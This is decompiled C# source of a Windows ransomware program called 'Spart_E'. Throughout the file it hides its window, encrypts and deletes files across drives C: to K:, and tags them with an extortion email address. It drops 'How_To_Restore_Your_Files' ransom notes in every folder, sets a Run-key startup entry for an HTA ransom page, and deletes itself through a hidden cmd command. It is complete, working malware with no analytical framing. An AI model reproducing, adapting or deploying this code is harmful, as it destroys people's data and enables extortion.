using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Spart_E.Properties;

namespace Spart_E;

public class Form1 : Form
{
	private string EncryptionFileExtension = ".Encrypted";

	private string VolumeSerial;

	private string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

	private string EncryptionPassword;

	private string[] Extensions_ToEncrypt = new string[1] { ".Encrypted" };

	private string[] Drives = new string[9] { "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "C:\\" };

	private string WorkFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Temp (x86)\\");

	private string EncryptedFilesList;

	private readonly HashSet<string> EncryptedFiles = new HashSet<string>();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	public string GetVolumeSerial(string drive)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
		val.Get();
		string result = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		val.Dispose();
		return result;
	}

	public void Start_Encryption()
	{
		VolumeSerial = GetVolumeSerial("C");
		EncryptionPassword = CreateRandomString(22, charset) + "==";
		SendPassword(EncryptionPassword);
		HashSet<string> extensionsToEncrypt = new HashSet<string>(Extensions_ToEncrypt);
		string[] drives = Drives;
		foreach (string dirPath in drives)
		{
			EncryptFiles(dirPath, ".SpartCrypt[LordCracker@protonmail.com]-[ID-" + VolumeSerial + "]" + EncryptionFileExtension, extensionsToEncrypt);
		}
		EncryptedFilesList = Path.Combine(WorkFolderPath, "Encrypted-Files.txt");
		if (!File.Exists(EncryptedFilesList))
		{
			string[] contents = EncryptedFiles.ToArray();
			File.WriteAllLines(EncryptedFilesList, contents);
		}
		else
		{
			string[] contents2 = EncryptedFiles.ToArray();
			File.AppendAllLines(EncryptedFilesList, contents2);
		}
		Readme_Config();
		Create_info();
		info_config(WorkFolderPath);
		SetStartupRegistry(Path.Combine(WorkFolderPath, "info.hta"));
	}

	public IEnumerable<string> GetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string subDir in directories)
				{
					queue.Enqueue(subDir);
				}
			}
			catch
			{
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch
			{
			}
			if (files != null)
			{
				string[] array = files;
				for (int j = 0; j < array.Length; j++)
				{
					yield return array[j];
				}
			}
		}
	}

	public void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
	{
		foreach (string item in from file in GetFiles(dirPath)
			from ext in extensionsToEncrypt
			where !file.EndsWith(ext)
			select file into file
			select new
			{
				file = file,
				fi = new FileInfo(file)
			} into t
			where t.fi.Length < 100000000000L
			select t.file)
		{
			try
			{
				if (EncryptFile(item, encryptionExtension))
				{
					EncryptedFiles.Add(item);
				}
			}
			catch
			{
			}
		}
	}

	public bool EncryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (path.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase) || path.StartsWith(WorkFolderPath, StringComparison.InvariantCultureIgnoreCase) || path.StartsWith("C:\\Program Files (x86)\\Internet Explorer", StringComparison.InvariantCultureIgnoreCase) || path.StartsWith("C:\\Program Files\\Internet Explorer", StringComparison.InvariantCultureIgnoreCase) || path.StartsWith("D:\\Windows", StringComparison.InvariantCultureIgnoreCase))
			{
				return false;
			}
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String(EncryptionPassword);
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			EncryptFile(aesCryptoServiceProvider, path, path + encryptionExtension);
		}
		catch
		{
			return false;
		}
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	public void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateEncryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
		try
		{
			if (!Directory.Exists(WorkFolderPath))
			{
				Directory.CreateDirectory(WorkFolderPath);
			}
			Start_Encryption();
			Start_Process();
			SelfDestroy();
			Application.Exit();
		}
		catch
		{
		}
	}

	public string CreateRandomString(int length, string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append(str[random.Next(str.Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		string text = Environment.MachineName.ToString();
		string userName = Environment.UserName;
		string text2 = text + "  " + userName + "  " + password + "  " + VolumeSerial;
		string path = Path.Combine(WorkFolderPath, "SINFO.txt");
		string[] contents = new string[2] { "Information : ", text2 };
		File.WriteAllLines(path, contents);
	}

	public void Create_How_To_Restore(string path)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(path + "/How_To_Restore_Your_Files.txt");
			string value = Resources.How_To_Restore_Your_Files.Replace("+++PCID+++", VolumeSerial);
			streamWriter.Write(value);
			streamWriter.Close();
		}
		catch
		{
		}
	}

	public void info_config(string path)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(path + "/info.hta");
			string value = Resources.info.Replace("+++PCID+++", VolumeSerial);
			streamWriter.Write(value);
			streamWriter.Close();
		}
		catch
		{
		}
	}

	public void Readme_Config()
	{
		try
		{
			string[] drives = Drives;
			foreach (string path in drives)
			{
				Readme_Create(path);
			}
		}
		catch
		{
		}
	}

	public void Readme_Create(string path)
	{
		try
		{
			Create_How_To_Restore(path);
		}
		catch
		{
		}
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					queue.Enqueue(text);
					if (!text.Contains("C:\\Windows"))
					{
						Create_How_To_Restore(text);
					}
				}
			}
			catch
			{
			}
		}
	}

	public void Create_info()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			info_config(folderPath);
		}
		catch
		{
		}
	}

	public void Start_Process()
	{
		try
		{
			Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\How_To_Restore_Your_Files.txt");
			Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\How_To_Restore_Your_Files.txt");
			Process.Start("explorer.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\info.hta");
			Process.Start("mshta.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\info.hta");
		}
		catch
		{
		}
	}

	public void SetStartupRegistry(string exePath)
	{
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)?.SetValue(Path.GetFileName(exePath), exePath);
	}

	public void SelfDestroy()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C timeout 2 && Del /Q /F " + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
